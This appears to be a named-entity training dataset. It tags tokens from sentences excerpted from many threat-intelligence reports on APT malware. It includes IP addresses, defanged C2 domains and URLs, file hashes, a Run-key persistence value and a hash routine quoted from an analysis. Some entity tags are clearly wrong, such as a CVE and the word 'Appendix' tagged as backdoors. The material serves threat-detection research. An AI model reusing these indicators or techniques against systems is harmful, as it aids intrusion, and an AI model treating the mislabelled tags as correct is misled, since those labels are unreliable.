persistent O
threat O
; O
cyber O
attack O
; O
Dark O
Seoul O
; O
defense O
; O
malware O
analysis O
; O

The O
vast O
majority O
of O
the O
submissions O
come O
from O
big O
organizations O
such O
as O
Antivirus O
companies O
. O

( O
185.99.32.0/22 B-ip.unknown
, O
78.40.183.0/24 B-ip.unknown
) O
One O
of O
the O
fake O
Facebook O
profile O
's O
likes O
are O
also O
interesting O
, O
and O
if O
any O
of O
the O
victims O
had O
taken O
a O
closer O
look O
at O
these O
, O
they O
may O
not O
have O
fallen O
for O
the O
scam O
. O

With O
services O
that O
include O
strategy O
and O
risk O
management O
, O
cyber O
defense O
, O
digital O
identity O
, O
application O
security O
and O
managed O
security O
, O
Accenture O
enables O
businesses O
around O
the O
world O
to O
defend O
against O
known O
sophisticated O
threats O
, O
and O
the O
unknown O
. O

This O
short O
paper O
outlines O
our O
current O
perspectives O
on O
the O
previously O
discussed O
espionage O
groups O
currently O
using O
the O
framework O
and O
a O
hint O
that O
a O
5 O
player O
is O
getting O
in O
on O
the O
game O
. O

OMPARISON O
OF O
DISASSEMBLING O
COMMANDS O
OF O
MODULE O
........................................................................... O
9 O

After O
understanding O
the O
logic O
( O
logic O
is O
mentioned O
below O
) O
& O
to O
satisfy O
the O
condition O
the O
environment O
was O
configured O
to O
give O
proper O
response O
whenever O
the O
malware O
made O
a O
request O
to O
Jobwork1.php O
or O
Jobwork2.php O
. O

This O
paper O
highlights O
many O
of O
these O
techniques O
and O
how O
we O
were O
able O
to O
bypass O
them O
. O

A O
campaign O
masquerading O
as O
a O
call O
to O
arms O
by O
a O
pro-opposition O
cleric O
. O

Just O
because O
the O
boot O
sector O
of O
the O
VBR O
is O
recoverable O
does O
n't O
mean O
that O
everything O
on O
the O
file O
system O
will O
be O
restored O
to O
normal O
. O

2 O
. O

Several O
hours O
later O
, O
a O
dropper O
would O
appear O
on O
the O
compromised O
computer O
. O

2/10 O
It O
sets O
the O
value O
of O
' O
BITSRAN B-malware.drop
' O
to O
point O
to O
the O
executable O
in O
the O
Temp O
location O
above O
. O

This O
DecryptResources_sub_49F92C O
( O
) O
function O
actually O
decrypts O
a O
lot O
of O
encrypted O
bot O
parameters O
stored O
in O
various O
resources O
; O
some O
of O
the O
more O
interesting O
ones O
are O
as O
follows O
: O

The O
app O
was O
created O
to O
test O
the O
library O
injection O
. O

A O
call O
to O
a O
hooked O
API O
then O
results O
in O
the O
calling O
application O
invoking O
a O
trampoline O
function O
, O
which O
performs O
malicious O
activity O
and O
then O
passes O
control O
on O
to O
the O
legitimate O
API O
. O

Server O
Uranio3 O

Blog O
, O
[ O
online O
] O
19 O
March O
2013 O
, O
Available O
: O
https://blog.avast.com/2013/03/19/analysis-of-chinese-attack-against-korean-banks/ B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
J. O
Schwartz O
, O
' O
South O
Korea O
Changes O
Story O
On O
Bank O
Hacks O
, O
' O
Information O
Week O
[ O
online O
] O
22 O
March O
2013 O
, O
Available O
: O
http://www.informationweek.com/security/attacks/south-korea-changes-story-on-bank-hacks/240151542 B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
' O
Remote O
Linux O
Wiper O
Found O
in O
South O
Korean O
Cyber O
Attack O
, O
' O
Symantec O
Connect O
[ O
online O
] O
20 O
March O
2013 O
, O
Available O
: O
http://www.symantec.com/connect/blogs/remote-linux-wiper-found-south-korean-cyber-attack B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
' O
Trojan.Jokra B-malware.unknown
, O
' O
Symantec O
Security O
Response O
, O
[ O
online O
] O
27 O
March O
2013 O
, O
http://www.symantec.com/security_response/writeup.jsp?docid=2013-032014-2531-99 B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
' O
CVE-2012-1889 B-malware.backdoor
, O
' O
Common O
Vulnerabilities O
and O
Exposures O
, O
[ O
online O
] O
22 O
March O
2012 O
, O
Available O
: O
http://www.cve.mitre.org/cgibin/cvename.cgi?name=CVE-2012-1889 B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
Metasploit O
, O
' O
Microsoft O
XML O
Core O
Services O
MSXML O
Uninitialized O
Memory O
Corruption O
, O
' O
The O
Exploit O
Database O
, O
[ O
online O
] O
http://www.exploit-db.com/exploits/19186/ B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
J. O
Blasco O
, O
' O
A O
theory O
on O
the O
South O
Korean O
attacks O
, O
' O
Alien O
Vault O
Labs O
[ O
online O
] O
20 O
March O
2013 O
, O
Available O
: O
http://labs.alienvault.com/labs/index.php/2013/a-theory-on-the-south-korean-attacks/ B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
' O
Trojan.Jokra B-malware.unknown
, O
' O
Symantec O
Security O
Response O
, O
[ O
online O
] O
27 O
March O
2013 O
, O
http://www.symantec.com/security_response/writeup.jsp?docid=2013-032014-2531-99&tabid=2 B-url.normal
( O
Accessed O
: O
18 O
April O
2013 O
) O
G O
. O

Uranio O
Sinkhole O
Analysis O

Analyses O
of O
multiple O
customized O
malware O
binaries O
hosted O
within O
a O
small O
U.S. O
subnet O
have O
likely O
been O
used O
to O
target O
Indian O
military O
or O
government O
entities O
. O

Initial O
response O
from O
the O
command O
and O
control O
server O
After O
the O
check O
, O
the O
malware O
gets O
the O
following O
system O
information O
, O
which O
it O
sends O
to O
the O
C O
& O
C O
via O
an O
HTTP O
POST O
request O
: O
· O
User O
name O
, O
Computer O
Name O
, O
OS O
, O
and O
CPU O
information O
Fig O
8 O
. O

Use O
of O
Malware O
that O
sleeps O
for O
long O
time O
without O
generating O
any O
network O
activity O
( O
to O
evade O
sandbox O
analysis O
) O
Use O
of O
hosting O
provider O
to O
host O
C2 O
infrastructure O

@ O
@ O
sernum1 O
getres O
@ O
@ O
sernum2 O
ferry O
1 O
@ O
@ O
00 O
dir O
4 O

During O
our O
analysis O
, O
we O
also O
discovered O
that O
our O
customer O
was O
not O
the O
only O
person O
to O
encounter O
the O
Tempting B-malware.infosteal
Cedar I-malware.infosteal
Spyware I-malware.infosteal
, O
and O
, O
unfortunately O
, O
many O
fell O
for O
the O
trap O
. O

The O
attacker O
deployed O
TRITON B-malware.infosteal
shortly O
after O
gaining O
access O
to O
the O
SIS O
system O
, O
indicating O
that O
they O
had O
pre-built O
and O
tested O
the O
tool O
which O
would O
require O
access O
to O
hardware O
and O
software O
that O
is O
not O
widely O
available O
. O

Rampage.freetcp.com B-url.unknown
still O
resolves O
to O
103.229.125.157 B-ip.unknown
as O
of O
4/2/2015 O
Let O
's O
go O
ahead O
and O
take O
a O
look O
further O
into O
one O
of O
the O
other O
expoit O
documents O
, O
8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c B-hash
. O

Mon O
, O
5 O
May O
2014 O
09:47:22 O
+0600 O
lremit_Transfer_Error_Page.jar B-malware.infosteal

The O
malware O
then O
forces O
the O
computer O
to O
restart O
thus O
making O
it O
unusable O
. O

On O
Sunday O
August O
24 O
, O
2014 O
we O
observed O
a O
spear O
phish B-malware.infosteal
email O
sent O
to O
a O
Taiwanese O
government O
ministry O
. O

APT12 O
has O
the O
ability O
to O
adapt O
quickly O
to O
public O
exposures O
with O
new O
tools O
, O
tactics O
, O
and O
procedures O
( O
TTPs O
) O
. O

This O
technology O
already O
proved O
its O
effectiveness O
earlier O
this O
year O
, O
when O
it O
caught O
an O
Adobe O
Flash O
zero O
day O
exploit O
( O
CVE-2016-1010 O
) O
. O

The O
DLL O
then O
constructs O
a O
file O
name O
that O
consists O
of O
the O
host O
process O
name O
, O
formatted O
as O
: O

Facebook O
Comments O
Plugin O

By O
Email O

Dmitri O
Alperovitch O
There O
is O
rarely O
a O
dull O
day O
at O
CrowdStrike O
where O
we O
are O
not O
detecting O
or O
responding O
to O
a O
breach O
at O
a O
company O
somewhere O
around O
the O
globe O
. O

So O
, O
which O
language O
corresponds O
to O
the O
value O
1036 O
, O
or O
0x40c O
in O
hexadecimal O
? O

Its O
filename O
is O
also O
picked O
from O
a O
hardcoded O
list O
. O

' O
Silence O
of O
the O
Jews O
make O
the O
Church O
of O
the O
Nativity O
of O
the O
Palestinians.doc-----------.scr O
' O
Found O
in O
Israel O

The O
use O
of O
both O
SSL/TLS O
and O
encoded O
communications O
show O
the O
knowledge O
many O
enterprises O
perform O
SSL O
man-in-the-middle O
decryption O
of O
traffic O
and O
this O
provides O
a O
layer O
to O
hide O
communications O
from O
incident O
responders O
. O

Poseidon B-malware.infosteal
has O
maintained O
a O
consistently O
evolving O
toolkit O
since O
the O
mid­2000s O
. O

The O
operator O
is O
able O
to O
uninstall O
legitimate O
applications O
such O
as O
Telegram O
and O
WhatsApp O
to O
install O
the O
malicious O
versions O
described O
in O
the O
next O
section O
. O

This O
range O
is O
located O
in O
Gaza O
and O
belongs O
to O
a O
provider O
headquartered O
in O
Ramallah O
in O
the O
West O
Bank O
: O

Identify O
the O
Threat O
Sign O
up O
for O
Free O
Facebook O
Twitter O
Contact O
Us O
• O
Privacy O
Policy O
• O
Terms O
of O
Service O
© O
2014 O
CyberSquared O
Inc O
. O

The O
malware O
uses O
Allatori O
Java O
Obfuscator O
to O
protect O
the O
code O
and O
make O
it O
harder O
to O
reverse O
engineer O
and O
it O
obviously O
uses O
communication O
protocol O
based O
on O
Java O
JSON O
objects O
encapsulated O
in O
SSL O
connection O
wrapper O
. O

© O
AhnLab O
, O
Inc O
. O

The O
rest O
of O
the O
bytes O
are O
variable O
( O
for O
example O
, O
66664640 O
is O
a O
floating O
point O
version O
number O
of O
ZxShell B-malware.backdoor
) O
. O

Those O
names O
were O
: O
testnew1.docx O
Test123.docx O
test456.docx O
test2.docx O
book1test2.xlsx O
Test123.doc O
Our O
initial O
discovery O
of O
GravityRAT B-malware.drop
was O
through O
a O
malicious O
Word O
document O
. O

Indeed O
, O
techto-earth[.]com B-url.cncsvr
shows O
up O
in O
Google O
with O
an O
entry O
on O
the O
URL O
checking O
service O
URLQuery[.]net O
. O

The O
sample O
also O
contains O
a O
keylogger O
functionality O
, O
as O
shown O
in O
Figure O
24 O
. O

ZxShell B-malware.backdoor
plugins I-malware.backdoor
are O
parsed O
and O
loaded O
with O
the O
AnalyseAndLoadPlugins O
function O
. O

Tools O
and O
information O
about O
security O
and O
communications O
are O
in O
constant O
circulation O
. O

Its O
features O
are O
broadly O
similar O
to O
the O
PC O
version O
of O
FinSpy B-malware.backdoor
identified O
in O
Bahrain O
, O
but O
it O
also O
contains O
mobile-specific O
features O
such O
as O
GPS O
tracking O
and O
functionality O
for O
silent O
' O
spy O
' O
calls O
to O
snoop O
on O
conversations O
near O
the O
phone O
. O

The O
first O
modification O
of O
the O
Stuxnet B-malware.backdoor
worm O
, O
created O
in O
2009 O
, O
used O
only O
one O
driver O
file O
- O
mrxcls.sys O
without O
a O
digital O
signature O
. O

22 O

ةي O
غامد O
ةطل O
ج O
ب O
يمي O
هار O
بلاا O
رض O
خلاا O
ي O
لود O
لا O
ثوع O
ب O
م O
لا O
ة O
باص O
ا O
.zip O

def O
hashStr O
( O
st O
) O
: O
hash O
= O
0 O
count O
= O
0 O
while O
count O
< O
len O
( O
st O
) O
: O
h1 O
= O
( O
hash O
< O
< O
0x13 O
) O
& O
0xFFFFFFFF O
h2 O
= O
( O
hash O
> O
> O
0x0d O
) O
& O
0xFFFFFFFF O
h3 O
= O
( O
h1 O
| O
h2 O
) O
& O
0xFFFFFFFF O
hash O
= O
( O
h3 O
+ O
( O
ord O
( O
st O
[ O
count O
] O
) O
^0x4a O
) O
) O
& O
0xFFFFFFFF O
count O
+= O
1 O
return O
hash O

[ O
그림 O
10 O
] O
Aryan의 B-malware.backdoor
특징적인 O
문자열 O
Ghostrat은 B-malware.backdoor
중국에서 O
제작된 O
백도어로 O
, O
소스코드도 O
공개되어 O
있다 O
. O

TeamViewer O
client O
registry O
settings O
are O
then O
HKLMSoftwareGoldstagerVersion5 O
and O

Sent O
accept O
headers O
are O
: O

The O
symbol O
' O
g_bCreateListenSck O
' O
is O
set O
to O
1 O
. O

The O
email O
purported O
to O
have O
been O
sent O
from O
legitimate O
email O
ids O
. O

Once O
the O
the O
macro O
content O
is O
enabled O
, O
it O
calls O
an O
auto O
execute O
function O
Workbook_Open O
( O
) O
which O
in O
turn O
downloads O
the O
malware O
sample O
and O
executes O
on O
the O
system O
. O

China B-malware.backdoor
Chopper I-malware.backdoor
The O
is O
an O
increasingly O
popular O
Web B-malware.ransom
shell O
that O
packs O
a O
powerful O
punch O
into O
a O
small O
package O
. O

Fidelis O
initially O
approached O
the O
Shamoon B-malware.unknown
analysis O
strictly O
from O
a O
perspective O
of O
determining O
what O
forensic O
artifacts O
could O
be O
recovered O
from O
a O
targeted O
system O
. O

It O
is O
subject O
to O
change O
. O

The O
GET O
request O
has O
the O
format O
: O

The O
popup O
displayed O
by O
Java O
is O
displayed O
below O
. O

- O
Shusei O
Tomonaga O

The O
ZIP O
archive O
contained O
a O
legitimate O
Microsoft O
tool O
and O
the O
malicious O
Trojan O
. O

If O
the O
SIS O
and O
DCS O
controls O
fail O
, O
the O
final O
line O
of O
defense O
is O
the O
design O
of O
the O
industrial O
facility O
, O
which O
includes O
mechanical O
protections O
on O
equipment O
( O
e.g. O
rupture O
discs O
) O
, O
physical O
alarms O
, O
emergency O
response O
procedures O
and O
other O
mechanisms O
to O
mitigate O
dangerous O
situations O
. O

However O
, O
the O
Mac O
agent O
brings O
more O
spying O
capabilities O
such O
as O
stealing O
iOS O
backups O
from O
Mac O
computers O
, O
which O
contain O
messages O
, O
contacts O
, O
voicemail O
, O
call O
history O
, O
notes O
, O
calendar O
and O
Safa O
ri O
data O
. O

Not O
all O
that O
much O
– O
it O
's O
just O
a O
downloader O
. O

Figure O
6 O
. O

So O
we O
will O
rename O
this O
function O
as O
Integerize_sub_44C1C0 O
( O
) O
, O
and O
head O
back O
to O
the O
main O

107.191.62[.]45 B-ip.unknown
94.100.21[.]213 B-ip.unknown
89.38.97[.]112 B-ip.unknown
148.251.197[.]113 B-ip.unknown
83.142.230[.]113 B-ip.unknown
87.117.204[.]113 B-ip.unknown
89.38.97[.]115 B-ip.unknown
87.117.204[.]115 B-ip.unknown
185.22.172[.]40 B-ip.unknown
92.243.95[.]203 B-ip.unknown
91.218.114[.]204 B-ip.unknown
86.105.227[.]224 B-ip.unknown
91.218.114[.]225 B-ip.unknown
134.119.217[.]84 B-ip.unknown
In O
one O
case O
, O
Symantec O
found O
what O
appeared O
to O
be O
a O
staging O
server O
used O
by O
the O
attackers O
. O

Previous O
reporting O
likened O
netsat.exe O
as O
a O
headquarters O
application O
and O
netui3.dll O
as O
a O
field O
unit O
with O
the O
following O
basic O
functionality O
: O
Headquarters O
( O
netsat.exe O
) O
Running O
on O
a O
possibly O
compromised O
system O
Logging O
some O
activity O
and O
errors O
to O
a O
file O
Receiving O
commands O
via O
an O
encrypted O
file O
on O
the O
local O
system O
( O
possible O
C2 O
) O
Listening O
for O
drive O
connections O
Infecting O
connected O
drives O
with O
netui3.dll/winmgt.dll O
( O
setup35.exe O
+ O
Autorun.inf O
) O
Collecting O
data O
gathered O
by O
any O
infected O
drives O
, O
ostensibly O
upon O
their O
return O
from O
being O
connected O
to O
other O
systems O
Field O
Unit O
( O
netui3.dll O
) O
Collecting O
information O
about O
systems O
it O
comes O
into O
contact O
with O
through O
connection O
to O
the O
targeted O
systems O
with O
the O
drive O
whereon O
the O
malware O
resides O
Collecting O
file O
listings O
from O
local O
and O
share O
connected O
drives O
Discovering O
and O
connecting O
to O
shared O
drives O
visible O
to O
the O
local O
targeted O
system O
Copying O
and O
writing O
files O
to/from O
drives O
visible O
to O
the O
local O
targeted O
system O
The O
following O
graphic O
serves O
to O
illustrate O
a O
possible O
basic O
theory O
of O
operation O
given O
available O
data O
: O

However O
, O
the O
code O
does O
not O
decrypt O
, O
reference O
, O
or O
use O
the O
following O
registry O
key O
in O
any O
way O
, O
which O
suggests O
that O
the O
malware O
author O
left O
this O
artifact O
in O
the O
code O
after O
swapping O
to O
the O
run O
key O
listed O
above O
: O
HKCU\Software\Microsoft\CTF\LangBarAddIn O
Cmstar B-malware.unknown
also O
decrypts O
a O
752-byte O
piece O
of O
shellcode O
that O
carries O
out O
communications O
with O
the O
C2 O
server O
, O
specifically O
by O
sending O
HTTP O
POST O
requests O
to O
the O
following O
URL O
: O
http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi B-url.unknown
It O
should O
be O
noted O
that O
the O
C2 O
URL O
contains O
the O
string O
' O
cgl-bin O
' O
, O
which O
visually O
resembles O
the O
common O
cgibin O
folder O
used O
by O
many O
webservers O
to O
run O
server-side O
scripts O
. O

When O
this O
file O
is O
double O
clicked O
, O
it O
opens O
a O
Word O
document O
with O
the O
logo O
of O
the O
Palestinian O
Political O
and O
National O
Guidance O
Commission O
. O

HKLMSoftwareCoinstagerVersion5 O
correspondingly O
. O

In O
the O
first O
DustySky B-malware.drop
report O
, O
we O
mentioned O
we O
know O
the O
identity O
of O
the O
attacker O
, O
but O
have O
decided O
not O
to O
reveal O
it O
. O

22 O
Oct O
. O

Below O
screen O
shot O
shows O
the O
IP O
addresses O
in O
the O
text O
file O
. O

The O
memory O
location O
where O
is O
pointing O
looks O
like O
the O
following O
. O

It O
reveals O
the O
' O
1a53b0cp32e46g0qio9 O
' O
static O
string O
sent O

Document O
Status O
: O
FINAL O
Last O
Revised O
: O
2014-01-31 O

ZIP O
file O

These O
tasks O
usually O
involve O
the O
execution O
of O
modules O
or O
executables O
providing O
additional O
functionality O
. O

https://malwr.com/analysis/ZDg3Nzg3MDM3MWQwNDdmNTgwYWRmOTJkNWFhYTQ0ZjY/ B-url.normal

directory O
listing O
obtained O
from O
next O
connected O
drive O
this O
S/N O
is O
from O
actually O
attached O
drive O

Payloads O

File O
Name O
: O
Invitation.jar B-malware.infosteal
File O
Size O
: O
43866 O
bytes O
MD5 O
: O
859c4c667dd0f44f80b60242d93c4b0f B-hash
SHA1 O
: O
40859bc18ea0ffa9bcf5af699336fbdbfd6be7f1 B-hash

Furthermore O
, O
the O
decrypted O
data O
payloads O
will O
only O
reside O
in O
memory O
, O
challenging O
traditional O
disk O
forensics O
and O
non-volatile O
artifact O
analysis O
. O

Subscribe O

Tags O

After O
understanding O
the O
logic O
& O
to O
satisfy O
the O
condition O
the O
environment O
was O
configured O
to O
give O
proper O
response O
. O

The O
handle O
' O
xman_1365_x O
' O
( O
self-identified O
on O
security O
forums O
as O
Mahdi O
Honarvar O
) O
was O
found O
by O
FireEye O
in O
malware O
artifacts O
, O
which O
open O
sources O
linked O
to O
the O
Nasr O
Institute O
. O

The O
implant O
's O
first O
target O
was O
a O
major O
government-controlled O
financial O
organization O
. O

This O
JAR O
provides O
technical O
indicators O
related O
to O
many O
of O
these O
operations O
, O
recommended O
mitigations O
, O
suggested O
actions O
to O
take O
in O
response O
to O
the O
indicators O
provided O
, O
and O
information O
on O
how O
to O
report O
such O
incidents O
to O
the O
U.S. O
Government O
. O

26 O
FA O
CA O
70 O
02 O
CB O
70 O
44 O
– O
Serial O
number O
. O

Instead O
, O
the O
Iranian O
government O
opted O
for O
speed O
and O
the O
most O
capable O
actors O
, O
regardless O
of O
demonstrated O
ideology O
. O

The O
FireEye O
Threat O
Prevention O
Platform O
provides O
real-time O
, O
dynamic O
threat O
protection O
without O
the O
use O
of O
signatures O
to O
protect O
an O
organization O
across O
the O
primary O
threat O
vectors O
and O
across O
the O
different O
stages O
of O
an O
attack O
life O
cycle O
. O

Disable O
potentially O
harmful O
SQL-stored O
procedure O
calls O
. O

As O
an O
example O
, O
here O
is O
the O
output O
of O
the O
' O
cronlist O
' O
command O
after O
a O
' O
wakeup O
' O
command O
has O
been O
scheduled O
to O
run O
on O
7 O
April O
2015 O
at O
15:44 O
: O
As O
we O
can O
see O
, O
each O
entry O
is O
identified O
by O
an O
' O
Id O
' O
, O
an O
incrementing O
hexadecimal O
number O
starting O
at O
0xC0 O
. O

Each O
Svchost O
group O
can O
contain O
one O
or O
more O
service O
names O
that O
are O
extracted O
from O
the O
following O
registry O
key O
, O
whose O
Parameters O
key O
contains O
a O
ServiceDLL O
value O
: O

Finally O
, O
the O
' O
Visibility O
' O
field O
defines O
whether O
the O
command O
execution O
will O
be O
reported O
to O
the O
C O
& O
C O
( O
the O
other O
possible O
value O
being O
' O
Silent O
' O
) O
. O

We O
can O
speculate O
that O
these O
malicious O
updates O
were O
deployed O
in O
a O
stealthy O
way O
to O
computer O
networks O
that O
belong O
to O
high-value O
targets O
. O

These O
operations O
were O
a O
departure O
from O
Gerdab O
's O
focus O
on O
maintaining O
domestic O
moral O
values O
and O
defending O
government O
rhetoric O
. O

Decoy O
Document O
Author O
: O

targattacks O
dll O

4/10 O
The O
ransomware O
deletes O
the O
Volume O
Shadow O
Copies O
( O
a O
type O
of O
backup O
on O
Windows O
) O
, O
using O
command O
: O

Screenshot O
: O

공격자는 O
행사 O
주최측으로 O
가장해 O
매크로를 O
포함한 O
엑셀이나 O
워드 O
문서를 O
첨부한 O
이메일을 O
발송했다 O
. O

It O
integrates O
the O
free O
version O
of O
Armitage O
under O
bt5 O
and O
kali O
linx O
, O
and O
the O
most O
powerful O
functionality O
is O
adding O
the O
Payload O
of O
Beacon O
. O

22CBE2B0F1EF3F2B18B4C5AED6D7 O
BB7 O
9 O
0D032087 O
8946A7 O
37 O
49111E6C94BF1525 O
ac337 O
bd5f6f18b8fe009e45d65a2b09b O
04dece2662f648f619d9c037 O
7 O
a7 O
ba7 O
c0 O
bbs.sonypsps[.]com B-url.unknown
update.iaacstudio[.]com B-url.unknown
wh0am1.itbaydns[.]com B-url.unknown
google-updata[.]tk B-url.unknown
windows-updata[.]tk B-url.unknown

? O
\Parameters\ O

In O
the O
oldest O
version O
of O
GravityRAT B-malware.drop
, O
the O
attacker O
potentially O
leaked O
his O
or O
her O
first O
name O
in O
the O
PDB O
: O
' O
Adeel O
' O
— O
the O
path O
contained O
' O
Adeel O
's O
Laptop O
' O
. O

Appendix B-malware.backdoor
B O
: O
ClamAV O
Signatures O

This O
particular O
binary O
contained O
the O
following O
debug O
string O
: O
The O
username O
' O
UmairAziz27 O
' O
reveals O
a O
Twitter O
account O
@ O
umairaziz27 O
for O
an O
' O
Optimistic O
Patriot O
by O
choice O
' O
who O
is O
' O
Working O
as O
InfoSec O
Analyst O
at O
@ O
Tranchulas O
. O
' O

In O
addition O
, O
although O
the O
clear O
fingerprints O
of O
the O
perpetrators O
leave O
no O
doubt O
we O
are O
witnessing O
the O
comeback O
of O
the O
same O
APT O
, O
it O
is O
still O
not O
yet O
confirmed O
exactly O
who O
the O
threat O
group O
behind O
this O
campaign O
actually O
is O
. O

These O
highly O
sophisticated O
cyber O
attacks O
easily O
circumvent O
traditional O
signature-based O
defenses O
, O
such O
as O
next-generation O
firewalls O
, O
IPS O
, O
anti-virus O
, O
and O
gateways O
. O

C:\%appdata%\a.exe O
Decrypted O
dropper O
. O

If O
a O
path O
is O
found O
, O
the O
dropper O
first O
extracts O
the O
Base64-encoded O
.NET O
executable O
scada.exe B-malware.unknown
to O
the O
current O
directory O
and O
then O
moves O
the O
file O
to O
the O
path O
containing O
move-to-operational O
or O
move-to-operational.lnk O
. O

Second O
, O
xman_1365_x O
created O
an O
Ashiyane O
profile O
on O
August O
8 O
, O
2010 O
, O
allegedly O
not O
long O
after O
Ashiyane O
temporarily O
became O
the O
primary O
security O
forum O
in O
Iran O
, O
following O
Behrooz O
Kamalian O
's O
visit O
to O
prominent O
cleric O
, O
Ayatollah O
Naser O
Makarem O
Shirazi O
. O

REPORT O
CTA-2018-0116 O

The O
promotion O
of O
the O
program O
was O
likely O
limited O
to O
social O
media O
, O
and O
the O
distribution O
was O
controlled O
from O
the O
author O
's O
main O
page O
, O
' O
Програмное O
обеспечение O
современного O
боя O
' O
( O
translation O
: O
' O
Modern O
combat O
software O
' O
) O
. O

The O
implant O
has O
so O
far O
not O
surfaced O
in O
any O
other O
sector O
or O
country O
. O

The O
methodology O
we O
proposed O
was O
effective O
and O
we O
were O
able O
to O
detect O
many O
interesting O
cases O
in O
which O
the O
malware O
authors O
directly O
interacted O
with O
the O
sandbox O
during O
the O
development O
phase O
of O
the O
threats O
. O

If O
instructed O
to O
do O
so O
, O
Bandook B-malware.unknown
will O
download O
additional O
DLL O
files O
which O
provide O
the O
specifically O
desired O
functionality O
. O

Netsat.exe B-malware.drop
functioned O
as O
a O
master O
application O
affording O
intruders O
the O
ability O
, O
in O
a O
selective O
and O
controlled O
manner O
, O
to O
infest O
removable O
devices O
with O
an O
agent O
application O
in O
the O
form O
of O
netui3.dll O
, O
aka O

See O
: O
RedOctober B-malware.unknown
Part O
1 O
RedOctober B-malware.unknown
Part O
2 O
Since O
January O
2013 O
, O
we O
've O
been O
on O
the O
lookout O
for O
a O
possible O
RedOctober B-malware.unknown
comeback O
. O

/Users/ B-malware.backdoor
kazak I-malware.backdoor
/Desktop/Project/ I-malware.backdoor
komplex I-malware.backdoor

Either O
backdoor O
identifier O
1 O
or O
backdoor O
identifier O
2 O
acts O
as O
the O
campaign O
code O
or O
marker O
for O
EvilGrab B-malware.drop
campaigns O
, O
which O
is O
recognizable O
by O
the O
C O
& O
C O
server O
and/or O
attacker O
. O

When O
it O
is O
necessary O
to O
use O
a O
driver O
for O
a O
new O
module O
, O
the O
authors O
use O
a O
dedicated O
program O
to O
modify O
information O
in O
the O
driver O
's O
' O
reference O
' O
file O
, O
i.e. O
its O
name O
and O
service O
information O
as O
well O
as O
the O
registry O
key O
and O
its O
value O
. O

osama O
bin O
laden O
password O
pdf O
pharmacy O
picture O
pinterest O
playstation O
poker O
pos O
privacy O
pup O
ransom O
riskware O
removal O
instructions O
rsa O
scan O
scareware O
shopping O
short O
url O
snowden O
socail O
engineering O
soccer O

Therefore O
, O
the O
use O
of O
MS10-002 O
should O
not O
be O
construed O
as O
an O
Aurora B-malware.infosteal
infection O
without O
further O
analysis O
of O
the O
dropped O
payload O
. O

RegCloseKey O
( O
hKey O
) O
; O
RegCloseKey O
( O
hKey O
) O
; O

The O
Python O
malware O
we O
mentioned O
first O
in O
this O
article O
constructed O
identical O
requests O
: O

The O
evolution O
of O
Unrecom B-malware.backdoor
RAT I-malware.backdoor
dates O
from O
its O
beginnings O
as O
a O
tool O
known O
as O
Frutas B-malware.infosteal
RAT I-malware.infosteal
, O
subsequently O
branded O
as O
Adwind B-malware.backdoor
RAT I-malware.backdoor
, O
and O
now O
Unrecom B-malware.backdoor
RAT I-malware.backdoor
. O

It O
means O
that O
to O
retrieve O
the O
value O
associated O
with O
a O
key O
, O
one O
has O
to O
calculate O
the O
hash O
of O
the O
key O
to O
locate O
a O
bucket O
from O
which O
the O
value O
can O
be O
retrieved O
. O

Agent.RUI O

These O
possible O
explanations O
are O
not O
mutually O
exclusive O
. O

, O
Peter O
Sahlas O
, O
a O
human O
rights O
attorney O
, O
several O
members O
of O
Mukhtar O
Ablyazov O
's O
family O
, O
Astolfo O
Di O
Amato O
, O
an O
Italian O
attorney O
who O
spearheaded O
anti-corruption O
litigation O
involving O
allegations O
of O
corruption O
by O
Kazakhstan O
, O
and O
dissident O
theater O
director O
Bolat O
Atabayev O
. O

Symantec O
has O
had O
protection O
for O
all O
of O
the O
Inception B-malware.backdoor
Framework I-malware.backdoor
tools O
since O
the O
initial O
emergence O
of O
the O
group O
in O
2014 O
. O

Babar B-malware.drop
's O
implant O
is O
a O
32-bit O
DLL O
written O
in O
C++ O
, O
which O
upon O
start O
injects O
itself O
to O
running O
processes O
and O
invades O
desktop O
applications O
by O
applying O
a O
global O
Windows O
hooks O
. O

Even O
though O
the O
identity O
of O
the O
recipient O
email O
could O
not O
be O
fully O
verified O
as O
this O
email O
id O
is O
nowhere O
available O
on O
the O
internet O
but O
based O
on O
the O
format O
of O
the O
recipient O
email O
id O
and O
from O
the O
list O
of O
attendees O
that O
is O
displayed O
to O
the O
victim O
in O
the O
decoy O
excel O
file O
, O
the O
recipient O
email O
could O
be O
possibly O
be O
associated O
with O
either O
the O
Indian O
Army O
or O
a O
Government O
entity O
. O

This O
method O
of O
sending O
links O
rather O
than O
waiting O
for O
visiting O
a O
specific O
compromised O
website O
has O
two O
main O
advantages O
: O
The O
advantage O
that O
the O
attacker O
does O
n't O
have O
to O
compromise O
sites O
that O
are O
relevant O
to O
the O
sector O
they O
wish O
to O
perform O
reconnaissance O
against O
, O
so O
generally O
this O
will O
make O
things O
easier O
for O
the O
attacker O
; O
and O
, O
The O
attacker O
has O
to O
deal O
with O
fewer O
false O
positives O
in O
terms O
of O
data O
received O
from O
victims O
. O

Molerats O
cluster O
analysis O
This O
is O
a O
cluster O
of O
Molerats O
activity O
. O

Guidance O
provided O
is O
applicable O
to O
many O
other O
computer O
networks O
. O

The O
actor O
took O
their O
time O
to O
ensure O
they O
were O
not O
within O
a O
virtual O
environment O
to O
avoid O
analysis O
. O

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ O
setting O
the O
key O
' O
bookstore O
' O
to O
the O
value O
' O
regsvr32 O
% O
path%\ctfmonrn.dll O
/s O
' O
, O
which O
ensures O
the O
malware O
runs O
every O
time O
at O
system O
boot O
. O

The O
blog O
highlighted O
that O
the O
backdoor O
was O
utilized O
in O
campaigns O
from O
March O
2011 O
till O
May O
2014 O
. O

If O
idle O
, O
the O
C O
& O
C O
will O
reply O
with O
' O
, O
and O
the O
malware O
will O
keep O
beaconing O
back O
the O
title O
bar O
of O
the O
currently O
active O
window O
, O
until O
it O
is O
instructed O
to O
do O
something O
else O
. O

[ O
그림 O
8 O
] O
중앙관리 O
솔루션 O
B에 O
대한 O
공격 O
도구 O
중앙관리 O
솔루션 O
C의 O
